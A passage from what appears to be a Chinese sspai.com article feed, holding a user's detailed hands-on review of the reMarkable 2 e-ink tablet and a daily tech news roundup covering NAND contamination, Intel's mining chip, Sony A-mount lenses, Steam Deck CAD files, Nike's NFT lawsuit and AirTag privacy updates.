体验报告","date":"2022-02-14 03:30:36","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>初见</h2>\n<p>我对电子墨水屏有初次认知是在初中的时候。那时，家里要换电器，就带上我一起去了苏宁电器。Kindle 的商铺就在入口不远处，一进门就能看见。</p>\n<p>销售人员和我妈说了一堆话术，而我专注地把玩眼前的阅读器，只听见一句「最适合爱读书的人。」或许因为这句话，又或许是觉得能够省下一些实体书的钱，我妈才下定决心买给我。我一直不知道这款设备的型号——后来才知道是 Kindle PaperWhite 3——只知道这类设备有一个统称的名字：电纸书。</p>\n<p>我确实用它看了不少书，比如《冰与火之歌》全套。这种设备，三年五年都不带坏的，加上我那时候信息闭塞，也就没有一直关注。直至 2018 年（我有了自己的电脑），我才在 TESTV 的 <a href=\"https://www.bilibili.com/video/BV16W411v7TM?share_source=copy_web\" target=\"_blank\">一期节目</a> 中看到这种大屏的 E-Ink 设备。</p>\n<p>看到它的第一眼，我觉得这就是我梦寐以求的设备啊！阅读 + 书写，完美。我把这个牌子记在心里，寻思出国我一定买一台。</p>\n<p>（关于第一代的更多信息，你可以看@青雪唐元的 <a href=\"https://sspai.com/post/59339\" target=\"_blank\">这篇文章</a>）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/06/88707dc222ff90b7714f7f1bde0dd918.png\"><figcaption>截自官方宣传片</figcaption></figure><p>2019 年到了美国之后，搜了官网，看了价格，觉得再考虑考虑，就在 Instagram 上关注了官方账号，接着忙学业去了。2020 年的某一天，我看到官方发布了第二代的宣传片：Next Generation Paper Tablet。我彻底心动了（请原谅我用自己翻译的视频）：</p> <p>我赶紧去官网看了产品介绍，立刻预购了。</p>\n<p>因为是预售，$399 包含本机 + 基础笔 + 基础保护套：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/07/292d808abc6354f84148c7e1ab690834.png\"><figcaption>来自官网</figcaption></figure><p>我加钱换购了灰色编织的 Book Folio，总共是 $470，但现在已然不是这个价格了：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/07/d523ddabc8b0cd90971b8d204c8fa91f.png\"></figure><p>本以为能够像官方说的在五月份拿到，结果因为疫情和港口等原因，硬是生生拖到了十月下旬，让我整整等了<strong>七个月</strong>。</p>\n<h2>硬件·Hardware</h2>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>配置</th>\n<th>具体参数</th>\n</tr></thead>\n<tbody>\n<tr>\n<th>尺寸</th>\n<td>187 x 246 x 4.7 mm</td>\n</tr>\n<tr>\n<th>重量</th>\n<td>≈ 403.5 g</td>\n</tr>\n<tr>\n<th>屏幕</th>\n<td>\n<p>10.3 英寸单色电子纸</p>\n<p>1872 x 1404 分辨率 (226 DPI)</p>\n<p>多点电容式触摸</p>\n<p>部分由 E 墨水 Carta 技术提供</p>\n</td>\n</tr>\n<tr>\n<th>手写笔</th>\n<td>\n<p>无需充电、设置或配对</p>\n<p>特殊摩擦笔尖</p>\n<p>4096 级压感</p>\n<p>倾斜检测</p>\n</td>\n</tr>\n<tr>\n<th>书写延时</th>\n<td>21 ms</td>\n</tr>\n<tr>\n<th>处理器</th>\n<td>1.2 GHz dual core ARM</td>\n</tr>\n<tr>\n<th>RAM + 储存空间</th>\n<td>1 GB LPDDR3 + 8 GB </td>\n</tr>\n<tr>\n<th>电池</th>\n<td>3000 mAh</td>\n</tr>\n<tr>\n<th>操作系统</th>\n<td>Codex（基于 Linux）</td>\n</tr>\n<tr>\n<th>文件支持</th>\n<td>PDF + EPUB</td>\n</tr>\n<tr>\n<th>WiFi</th>\n<td>支持 2.4 GHz 和 5GHz</td>\n</tr>\n<tr>\n<th>其他</th>\n<td>\n<p>菜单语言：仅支持英文</p>\n<p>同步 App：支持 Win 10、MacOs、iOS 和安卓</p>\n</td>\n</tr>\n</tbody>\n</table></figure><h3>屏幕·Canvas</h3>\n<p>虽说是元太供应的屏幕，但它们管这个叫做第二代画布屏（Second-Generation CANVAS Display）。因为拥有 4096 级别的压感和 21 ms 的延迟，使得 reMarkable 2 在日常书写时非常跟手，不会感受到明显的拖影，这也是为什么它也深受艺术创作者的喜爱。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2022/02/07/7879c5c7472b27e1207f99c26838bae3.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/02/07/9fba60af1b73b2227df760559a2c78c7.jpg\" alt=\"\"></figure><p>因为可以新建图层（layer），如果你愿意，也可以通过同步软件，把这个当作简单的数位板使用。看到那个红点了吗？那就是笔尖所在的位置。当然，期望别太高，仅仅够用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/07/f8143af340356c4a503bd6cdd3d2406d.png\"></figure><p>除此之外，在帮助与支持界面，<a href=\"https://support.remarkable.com/hc/en-us/articles/360006699557-Second-generation-CANVAS-display\" target=\"_blank\">屏幕</a> 的细则中列出了一般不会强调的两点：</p>\n<ul>\n<li>Paper-like surface friction（类似纸张的表面摩擦）</li>\n<li>Sunlight readable（阳光下可读）</li>\n</ul>\n<h4>类似纸张的表面摩擦</h4>\n<p>我很喜欢手写笔记，因为能够强化记忆和帮助学习。最早我买了 iPad 2018 和 Apple Pencil，觉得我终于能实现「纸张自由」了，但是在使用当中有个问题——写字太滑了，一点儿熟悉的写字感觉都没有。虽然网上搜到可以贴一个类纸膜，可又会降低阅读显示效果。我觉得有点儿多此一举了。</p>\n<p>首席设计官 Herding 的这句话能够总结了我的想法：</p>\n<blockquote>\n<p>Writing with a plastic stylus on a slippery surface is so low friction that your hand has to compensate, which is uncomfortable and leaves you with a stiff arm.</p>\n<p>在光滑的表面上用塑料手写笔书写，摩擦力非常低，以至于必须用手进行补偿。这很不舒服且让你的手臂僵硬。</p>\n</blockquote>\n<p>当我在 reMarkable 2 上写字的时候，这种熟悉的写字感觉又回来了：写字的摩擦声和那种独特的触感。虽然这种摩擦感我早就耳熟能详，也知道 reMarkable 做的是最好的，但终究比不上体验带来的真实：开箱之后写了几笔，写错之后，下意识地找橡皮。当橡皮对着屏幕的时候，我才突然意识到这竟然是屏幕。一周之后，这种条件反射的行为仍然存在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/07/55091321d3ba63904adfcb306de7d9c7.jpeg\"><figcaption>微观景象</figcaption></figure><p>首席设计馆 Herding 说，在这一代，为了用户带来了更好的书写体验，他们不仅使用了 2D 扫描，也采用了 3D 扫描，尽可能了解屏幕上什么地形（topography）带来什么体验。同时，通过这些微观景象，他们能够了解这些景象如何与笔尖材料相互作用，从而决定摩擦和书写体验。</p>\n<h4>阳光下可读</h4>\n<p>这款屏幕在日光下阅读没有反光，反而更加清晰。教室里的人造光下阅读，和笔记本一样。卧室顶灯照射效果和普通纸张差不太多，台灯照射的反光效果和杂志差不多——如果你看过《环球科学》那种杂志。</p>\n<h3>手写笔·Marker</h3>\n<p>首席设计馆 Herding 最讨厌的事情是产品设计不适合其配件。所以在立项之初，设计团队的目标就是以「无缝」和「共生」的方式设计配件。不像国内厂商采用公模笔，reMarkable 的笔都是经过设计的，不过代价就是挺贵的——Marker Plus 算上运费要 $140，将近 ￥890。</p>\n<p>基础笔拥有和正面面板几乎一样的白色，这也是我没有购买 Marker Plus 的原因之一，因为我很喜欢这样一体性的美感。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/07/3b559b0fad4b46691314b7de938e8fc1.JPG\"></figure><p>重量只有 19g，比我的自动铅笔还轻了 6g。磁吸出乎意料的可靠，拿着出街根本不会掉（除非你故意的）。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/07/2724eea7cc9562daef1af2033bb634a4.JPG\"></figure><figure class=\"ss-imgRows\" figcaption=\"marker &amp; marker plus（来自官网）\"><img src=\"https://cdn.sspai.com/2022/02/07/a44ab88288d81163cb698f46fbfc260b.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/02/07/343d810eb0b118fb37ea817c03a260dd.png\" alt=\"\"></figure><p>两款笔的唯一区别就是 Plus 带橡皮擦功能，黑色金属更提升质感。</p>\n<p>因为我习惯用花体写英文，日常写字只用钢笔。在没有 reMarkable 2 的时候，我记笔记买的都是灯塔本子，应为书写顺畅、不阴墨。</p>\n<p>所以，我很喜欢这款独特的笔刷：书法笔（Calligraphy Pen）也是我经常用的：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/07/46feb0deb841390eda90fb2d0f746787.png\"></figure><h2>外观·Industrial Design</h2> <p>真心希望国内厂商能学习一下这个宣传片的设计。这个宣传片展示了外观设计、书写体验，太美了。</p>\n<h3>轻·薄</h3>\n<p>403g 的重量加上 4.7mm 后的重量，我可以轻松地拿在手里。10.3 寸的尺寸既能很好地阅读 PDF 文件和记笔记，又具有很好的便携性。得益于零件的精密排布，重量分担被均匀分布，拿在手里阅读 30 分钟，也不会觉得很累。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/07/1a459a557cec0bf11ad198bc24da46ec.JPG\"><figcaption>大约 23 张 A4 纸这么厚</figcaption></figure><p>有时候去学校，我直接拿着 reMarkable 2 就走了，连包都不用带。</p>\n<p>由于坚实的机身结构设计和四周铝边框的巩固，2021 年初回国的时候，即使在我书包塞得满满当当的时候，它也没有弯曲。</p>\n<p>在机身如此轻薄的情况下，仍然塞进了 1.4 mm 厚的 3000 mha 电池。中度使用可以将近一周半到两周，但要是赶上考试周的话，那就一周一充。</p>\n<h3>为什么要做薄？| 背后故事</h3>\n<p><strong>越薄就越像纸</strong>。更薄的平板可以轻松地放入背包里，不会有重量负担，并且由于屏幕边缘和手臂休息之间的距离更小，书写更舒服。我记得曾经上课用厚教材的时候，批注很不方便，因为太厚了，导致我很难在边缘写字，姿势非常难受。</p>\n<p>为了做到更薄，设计团队把每一个零部件的厚度精确到<strong>小数点后四位</strong>，比如一根柔性电缆的厚度为 0.6745。</p>\n<blockquote>\n<p>I really hope people use the product naked.</p>\n<p>我真心希望人们能够裸机使用它。</p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/07/a332edb0ef96a5739b43543d36dc6601.jpeg\"><figcaption>零件</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/07/996ac642289dbec2d1a28d875cc3235a.jpeg\"><figcaption>螺丝和磁铁</figcaption></figure><p>在设计保护壳的时候，团队做了很多实验确保在不破坏产品本身轮廓和纤薄的情况下，满足一定的强度和坚固。</p>\n<p>是的。保护壳的质感非常好，也能够很好的保护产品本身。我选择的是灰色这款。由于我留学的地方冬天很长，所以灰色编织材料不会像皮革一样在冬天带来冰凉的感觉。当然，皮革所带来更高级质感和颜色，更适合商务人士。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/07/588eb02633bbdb9314a18f81e0beb42c.png\"><figcaption>来自官网</figcaption></figure><p>回到家，我还是更倾向于裸机使用，手感真的太棒了。</p>\n<h3>熟悉的外观</h3>\n<p>你也许从题图当中看出来这种设计和去年国产的一些机器都一样，比如掌阅 iReader Smart 2 和文石 Nova Air 2。这是因为 10.3 英寸显示屏的排线在左侧，所以只能这样设计。在这些设计当中，只有 reMarkable 2 的左侧铝制「书脊」是最窄的。</p>\n<p>除了被后续厂商追上的相似设计之外，「熟悉感」说的更是那种对纸张的熟悉。</p>\n<blockquote>\n<p>We wanted you to only be touching paper when you pick it up. The whole device should feel similar, wherever you touch it, like paper does. </p>\n<p>我们希望当你拿起它时，你只接触到纸。整个设备应该有类似的感觉，无论你在哪里触摸它，就像纸一样。</p>\n</blockquote>\n<p>所以，设计团队将 reMarkable 2 正反两面设计成一样的白色。他们比喻道：</p>\n<blockquote><p>这更像是一沓浸在铝里的纸。</p></blockquote>\n<p>从侧面看，确实很像一沓纸被铝框围住了一样。</p>\n<p>拿在手上的白色前面板，让我迫不及待地开始书写。我上述关于我写错找橡皮的事情，也有这一部分原因。它给我的直觉更像是说：</p>\n<p><strong>这是一张直接可以书写的纸，就是你从小熟悉的那张。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/07/a233b39e436750f69646330f2a32b26d.jpeg\"><figcaption>reMarkable blog</figcaption></figure><h2>软件</h2>\n<p>reMarkable 的产品理念不是做一个 tablet，而是做一个 better paper，以保护人们的专注力。为了确保产品在一个不受干扰的区域，让用户能够专注自己的思考，他们并没有加入很多功能，比如看视频和浏览各种 app。</p>\n<p>UX 团队认为纸是最简单的，纷扰最少，最能帮助我们专注思考的工具。他们希望既保留纸张原有的生命力，又尽可能地让它融入数字世界。他们清楚地知道有些东西对 reMarkable 来说就是不适合。</p>\n<p>当问到为什么 reMarkable 没有很多功能的时候，他们说：</p>\n<blockquote>\n<p>It’s tempting to constantly add new features, but the interesting question is how do those things fit into the reMarkable experience?</p>\n<p>不断增加新的功能是很诱人的，但有趣的问题是，这些东西如何融入 reMarkable 的体验？</p>\n</blockquote>\n<p>他们仍然在完善阅读和书写的体验：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>日期</th>\n<th>版本</th>\n<th>内容</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>2022.1</td>\n<td>2.12</td>\n<td><ul>\n<li>可在 PDF 和 EPUB 文件中新建空白页</li>\n<li>加强文档内搜索</li>\n</ul></td>\n</tr>\n<tr>\n<td>2021.12</td>\n<td>2.11</td>\n<td><ul>\n<li>整合 OneDrive</li>\n<li>提升了荧光笔</li>\n</ul></td>\n</tr>\n<tr>\n<td>2021.9</td>\n<td>2.10</td>\n<td><ul>\n<li>整合 Google Drive 和 Dropbox</li>\n<li>无 WiFi 分享屏幕</li>\n</ul></td>\n</tr>\n<tr>\n<td>2021.7</td>\n<td>2.9</td>\n<td><ul>\n<li>屏幕共享</li>\n<li>快速浏览</li>\n<li>文档抽屉</li>\n</ul></td>\n</tr>\n<tr>\n<td>2021.6</td>\n<td>2.8</td>\n<td><ul>\n<li>合并图层</li>\n<li>默认书写工具</li>\n</ul></td>\n</tr>\n<tr>\n<td>2021.5</td>\n<td>2.7</td>\n<td><ul>\n<li>改进导航</li>\n<li>智能荧光笔</li>\n<li>新键盘语言</li>\n</ul></td>\n</tr>\n<tr>\n<td>2021.3</td>\n<td>2.6</td>\n<td><ul>\n<li>捏合缩放</li>\n<li>提升 PDF 导航</li>\n<li>电子书视觉</li>\n</ul></td>\n</tr>\n</tbody>\n</table></figure><h2>痛点</h2>\n<ol>\n<li>云服务 404</li>\n<li>没有前灯。这一点见仁见智</li>\n<li>没有分屏笔记</li>\n<li>没有查词和翻译功能</li>\n<li>不能装软件、浏览网页</li>\n<li>不能扫码传文件</li>\n<li>EPUB 不支持中文</li>\n<li>一次不能传输超过 800 MB 的文件</li>\n</ol>\n<p>适合什么人：</p>\n<ol>\n<li>想体验业内最顶尖的书写感受</li>\n<li>只想阅读和书写的人</li>\n<li>专注于思考的人</li>\n</ol>\n<h2>感谢你能看到最后</h2>\n<blockquote>\n<p>虽千万人，吾往矣。</p>\n<p>——《孟子·公孙丑上》</p>\n</blockquote>\n<p>在如今这个纷扰的世界中，我们的专注力正在被短视频和碎片信息蚕食。与国内厂商所提倡的护眼平板不同，挪威的这家公司重新思考了当代人文与科技的关系，试图维护我们快要逝去的专注力。</p>\n<p>「Better Paper，Better Thinking」是他们的公司理念，作为理念的产品不管是第一代还是第二代都试图在彼此所在的年代尽力地展现这一「特立独行」的特征。</p>\n<p>虽然拥有这款设备和保持专注力也许既不相关，也没有因果关系，但至少当我们拿起 reMarkable 的时候，可以暂时专注于我们的思绪。</p>\n<p>理念：</p> <h2>附录</h2>\n<p><a href=\"https://support.remarkable.com/hc/en-us/articles/360006699557-Second-generation-CANVAS-display\" target=\"_blank\">Help | Product and Service</a></p>\n<p><a href=\"https://blog.remarkable.com/inside-remarkable-2-chapter-1-the-concept-94cbdc852d2a\">Inside reMarkable 2 — Chapter 1: The Concept</a></p>\n<p><a href=\"https://blog.remarkable.com/inside-remarkable-2-chapter-2-the-user-experience-66646f7cfcae\" target=\"_blank\">Inside reMarkable 2 — Chapter 2: The User Experience</a></p>\n<p><a href=\"https://blog.remarkable.com/inside-remarkable-2-chapter-3-the-hardware-6c56e30171c3\" target=\"_blank\">Inside reMarkable 2 — Chapter 3: The Hardware</a></p>\n<p><a href=\"https://remarkable.com/about\" target=\"_blank\">reMarkable | Our Story</a></p>\n<p><a href=\"https://support.remarkable.com/hc/en-us/articles/360002363378-Release-notes-overview-\" target=\"_blank\">Release Note Overview</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，找到数字时代更好的生活方式 🎊</p>\n<p>&gt; 年度回顾、好物推荐…… 更多精彩尽在 <a href=\"http://sspai.com/page/2021\" target=\"_blank\">少数派 2021 年度盘点</a> 🎉</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71294"},{"title":"派早报：西数铠侠存储产能受损、英特尔将推出低功耗挖矿芯片等","date":"2022-02-14 00:59:23","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>西数、铠侠闪存原材料受污染，或将减损产能并引发涨价</h3>\n<p>2 月 11 日，美国西部数据以及日本铠侠（前东芝存储）均发布公告声明，表示自一月份以来，由双方共同在日本地区运营的工厂用于生产闪存芯片的原材料遭受污染，导致工厂的产能受到影响。目前两家公司暂未明确污染事故原因，但西部数据预计事故将影响容量为 6.5 EB（1 EB 等于 1 百万 TB 或 10 亿 GB）的闪存芯片产能。据第三方机构预测，事故减产造成 NAND 在 2022 年第二季度涨价 5—10% 。<a href=\"https://www.tomshardware.com/news/western-digital-and-kioxia-report-3d-nand-contamination-impacts-at-least-65-exabytes\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/special/314/pic_404.png\" alt=\"NAND内存定价\" srcset=\"https://cdn.mos.cms.futurecdn.net/9qCPvP39g68ha7qXF9cVnb-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/9qCPvP39g68ha7qXF9cVnb-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/9qCPvP39g68ha7qXF9cVnb-970-80.jpg 970w\" sizes=\"100vw\"></figure><h3><strong>英特尔将进入比特币矿机芯片市场</strong></h3>\n<p>2 月 11 日，英特尔发布一篇<a href=\"https://www.intel.com/content/www/us/en/newsroom/opinion/thoughts-blockchain-custom-compute-group.html\">博客文章</a>，宣布将推出称为「Bonanza Mine ASIC」的「挖矿」专用芯片；还宣布成立一个隶属于加速计算和图形（AXG）业务部的定制化计算团队，专门设计区块链硬件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/article/9cc21d11b97f01885e5c0e9174719fc5\" alt=\"Intel Bonanza矿\" srcset=\"https://cdn.mos.cms.futurecdn.net/4vqAqFGbPweecmpZmKBUSX-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/4vqAqFGbPweecmpZmKBUSX-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/4vqAqFGbPweecmpZmKBUSX-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/4vqAqFGbPweecmpZmKBUSX-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/4vqAqFGbPweecmpZmKBUSX-1024-80.jpg 1024w\" sizes=\"100vw\"></figure><p>根据英特尔提供的信息，这种挖矿芯片针对比特币开采所用的 SHA-256（一种加密算法）专门优化，宣称使用该算法挖矿的每瓦性能比主流 GPU 高 1000 倍以上。据传闻，这款芯片将采用台积电 5nm 工艺制造；最快今年 6-7 月份，各大客户将根据英特尔的芯片完成比特币矿机并出货，首批客户包括 BLOCK（前身为 Square，由 Twitter 原 CEO Jack Dorsey 领导）、Argo Blockchain 和 GRIID Infrastructure 等。<a href=\"https://www.pcmag.com/news/intel-to-enter-bitcoin-mining-market-with-energy-efficient-gpu\" target=\"_blank\">来源</a></p>\n<h3><strong>索尼日本停售全部 A 卡口单反镜头</strong></h3>\n<p>2 月 11 日，索尼日本在其官方网上商店将现有共 33 款 A 卡口的镜头全部列为「停产」或「不再销售」（索尼美国官网暂时仍显示有货）。根据索尼官方的命名规则，A 卡口（ILCA-xx, DSLR-Axx, SLT-Axx）相机一般会有一个反光镜或者半透镜，而无反相机则使用 E 卡口（ILCE-xx, NEX-xx）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/article/71bcdbc436f21308604e0fa90850446e\" alt=\"Sony A Mount Lenses Discontinued\"></figure><p>此前在 2021 年 5 月，索尼已经宣布将停止生产 A 卡口的相机，此次 A 卡口镜头的停产被认为预示着索尼相机正式进入全无反时代。索尼最后一款 A 卡口单反相机为 2016 年发布的 a99 II，采用了 4240 万像素全幅背照式传感器，搭载了 399 点混合式自动对焦系统，内含 79 个十字对焦点。根据索尼的支持信息，A 卡口镜头可以通过适配器用于 E 卡口无反机身上，但反之则不行。<a href=\"https://www.ithome.com/0/602/630.htm\" target=\"_blank\">来源</a></p>\n<h3>Valve 公开 Steam Deck 外壳设计文件</h3>\n<p>2 月 12 日，Valve 根据知识共享（Creative Commons）许可协议，正式开放其游戏掌机 Steam Deck 的 CAD 文件供用户和供应商下载。Valve 表示，用户完全有权拆解自己的Steam Deck，但仍建议由专业人士进行处理，由自行拆机导致的损毁将不予保修。Steam Deck 于 2021 年 7 月宣布，在预售阶段被购买一空，而 Valve 亦因芯片短缺未能按承诺在去年底交付；目前，Valve 计划在 2 月 25 日通知首批产品预定者付款，2 月 28 日开始发货。<a href=\"https://store.steampowered.com/news/app/1675180/view/3106923225208810470\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/article/412395b8e053e5286ed93829cb8c1098\"></figure><h3>耐克起诉球鞋 NFT 侵犯商标权</h3>\n<p>2 月 10 日，耐克向一家服饰和运动鞋经销商 StockX 提起诉讼，称其在 1 月推出的所谓 Vault NFT 侵犯了耐克的商标权。StockX 此前承诺这些 NFT 与实物商品绑定，可以用来兑换实物，也可以作为数字商品交易。耐克主张 StockX 推出 NFT 的图片直接使用了耐克商品图，是在借用耐克的商标进行营销、推广，将影响耐克的声誉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/article/fc46e32c6545d13eb28faba541a33c4d\"></figure><p>对此，StockX 主张，发行的 NFT 是实际库存的运动鞋的所有权证明，销售 NFT 相当于销售实体鞋，因此适用商标法上的「权利用尽」原则，即耐克作为商标权人对于这些已售出产品的后续处置和展示无权干涉。耐克对这种定性表示反对。</p>\n<p>此前在 2021 年，耐克曾收购 NFT 工作室 RTFKT 打造自有品牌的 NFT 收藏品。<a href=\"https://www.theverge.com/2022/2/10/22925252/nike-stockx-shoe-lawsuit-vault-nft-trademark-infringement\">来源</a></p>\n<h3><strong>Apple 将进一步加强 AirTag 的隐私防护功能</strong></h3>\n<p>2 月 10 日，Apple 宣布将继续更新 iOS 中与 AirTag 相关的隐私警告。拟采用的警告语将在用户设置 AirTag 时弹出，明确表明 AirTag 将和 Apple ID 关联，使用 AirTags 跟踪他人可能构成犯罪，执法部门可以要求 Apple 提供 AirTag 所有者的身份信息等。同时，Apple 还将修订澄清同样具有防丢定位功能的 AirPods 相关通知，避免与 AirTag 报警混淆，造成用户困惑。对应的<a href=\"https://support.apple.com/en-us/HT212227\">支持文章</a>也同步更新，提供了有关 AirTag、AirPods 和「查找」网络配件内置安全功能的更多信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/article/1894ea251cec9c5256b0caea3e7259a7\" alt=\"AirTag is Linked to Apple ID Feature\" srcset=\"https://images.macrumors.com/t/-Vu929I3ZCW-Eh0GhuyikI57Loo=/400x0/article-new/2022/02/AirTag-is-Linked-to-Apple-ID-Feature.jpg?lossy 400w, https://images.macrumors.com/t/zgVxOwRUfkSJgDAslQBVEUnLPWU=/800x0/article-new/2022/02/AirTag-is-Linked-to-Apple-ID-Feature.jpg?lossy 800w, https://images.macrumors.com/t/VPantVDxlDWgrYOXhXTvgDhwI4Y=/1600x0/article-new/2022/02/AirTag-is-Linked-to-Apple-ID-Feature.jpg 1600w, https://images.macrumors.com/t/Xu5bmjzKLmPVOT39Rw1CfGMrL_Q=/2500x0/filters:no_upscale()/article-new/2022/02/AirTag-is-Linked-to-Apple-ID-Feature.jpg 2500w\" sizes=\"100vw\" width=\"2500\"></figure><p>此前，国外媒体多次报道 AirTag 被放置在邮件、车身等隐蔽位置，用来对他人开展追踪。对此，Apple 已经数次试图通过增加报警功能来提示被跟踪用户，还为 Android 用户提供了一个检测周围 AirTag 的应用。<a href=\"https://www.macrumors.com/2022/02/10/airtag-updates-unwanted-tracking/\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>据 Android Police 和 CrackBerry 报道，此前获得黑莓品牌授权的 OnwardMobility 原本计划在 2021 年推出带有物理键盘的 5G 黑莓手机，但目前该计划已被搁置，同时品牌授权许可也被黑莓取消，原因是黑莓的 CEO 程守宗不愿意该品牌的名字用在另一款智能手机上。<a href=\"https://www.androidpolice.com/the-5g-blackberry-is-dead/\" target=\"_blank\">来源</a>\n</li>\n<li>据爆料者 Greymon55 透露，AMD 锐龙 7000 系列处理器将在第三季度发布，该处理器将基于 5nm Zen 4 架构，并且 AMD Socket AM5 主板测试样品也即将生产。<a href=\"https://twitter.com/greymon55/status/1491981119905931273?s=20&amp;t=qXgaE2fKa9MqwLVrNFJP4g\">来源</a>\n</li>\n<li>据国外媒体报道，美国新罕布什尔州一家水族馆近日组织居民水獭开展了一场别开生面的艺术创作活动。2 月 11 日一早开始，五只水獭花了一天时间为它们的人类粉丝提前创作了情人节纪念品。水獭们套上毛绒手套、用爪子蘸着粉红色的无毒油漆，在工作人员的引导下随意挥毫，颇有毕加索风范。它们获得了一份零食作为优秀工作的奖励。据介绍，该馆计划在 2 月 14 日当天限量向 25 名报出口令（「暗恋者」）的游客提供这些水獭画家的签名作品。少数派员工 <a href=\"https://sspai.com/u/xyzyq6cj/updates\">吃派的水獭</a> 以工作繁忙为由拒绝了记者的采访请求。<a href=\"https://people.com/pets/new-hampshire-aquarium-otters-painting-valentines/\">来源</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/13/65a647f68e6825314854af45d173eec7.jpeg\"></figure><h2>少数派的近期动态</h2>\n<ul>\n<li>🎁 少数派 iOS 客户端<a href=\"https://itunes.apple.com/cn/app/id1191720421?mt=8\" target=\"_blank\">重大更新</a>，<a href=\"https://apps.apple.com/cn/app/id1191720421?eventid=6442693454\" target=\"_blank\">「派读」功能新鲜上线</a>，为你打造量身定制的内容拼盘。</li>\n<li>📕 <a href=\"https://sspai.com/prime/precog/techod-0x09\" target=\"_blank\">科技漫游第 0x09 期</a> 正在更新，学学如何<a href=\"https://sspai.com/prime/story/shortcuts-blood-pressure-monitering\" target=\"_blank\">用快捷指令帮家人记录血压</a>，更有 <a href=\"https://sspai.com/prime/story/charles-sina-lottery-tutorial\" target=\"_blank\">Charles 抓包实战</a>。</li>\n<li>🎇 会员通讯 <a href=\"https://sspai.com/prime/precog/vol015-pre-moving-forward\" target=\"_blank\">第 15 期</a> 上线，带你了解 <a href=\"https://sspai.com/prime/story/vol015-talk-about-background-check\" target=\"_blank\">工作背景调查</a>、建立 <a href=\"https://sspai.com/prime/story/vol015-how-to-take-smart-notes\" target=\"_blank\">写作工作流</a>、线下 <a href=\"https://sspai.com/prime/story/vol015-ebook-or-physical-book\" target=\"_blank\">读书找书</a> 等。</li>\n<li>☕ 少数派报告《<a href=\"https://sspai.com/prime/precog/specialty-coffee-report\" target=\"_blank\">精品咖啡入门指南</a>》已上线，从相对硬核的咖啡豆种、处理法、烘焙法到大家关心的器材和冲煮攻略，都在这里啦！</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>🤖 <a href=\"https://sspai.com/post/71407\" target=\"_blank\">Android 版本上演「三代同堂」：Android 13 DP1 更新抢先看</a>\n</li>\n<li>🚨 <a href=\"https://sspai.com/post/71372\" target=\"_blank\">舆论翻车后的救场之作，谷歌的定向广告新招干净又卫生了吗？</a>\n</li>\n<li>📚 <a href=\"https://sspai.com/post/71274\" target=\"_blank\">巧用分类法解决使用卡片笔记时遇到的困境</a>\n</li>\n<li>✨<a href=\"https://sspai.com/post/71348\" target=\"_blank\">四边等宽的 Galaxy、披着 S 之名的 Note：三星 Galaxy Unpacked 看点汇总</a>\n</li>\n<li>🎮 任天堂直面会 <a href=\"https://sspai.com/post/71352\" target=\"_blank\">消息汇总</a>、<a href=\"https://sspai.com/post/71354\" target=\"_blank\">种（拔）草建议</a>\n</li>\n<li>🌟<a href=\"https://sspai.com/post/71361\" target=\"_blank\">新玩意 093｜少数派的编辑们最近买了啥？ - 少数派</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\"><u>少数派 2.0 客户端</u></a>、关注 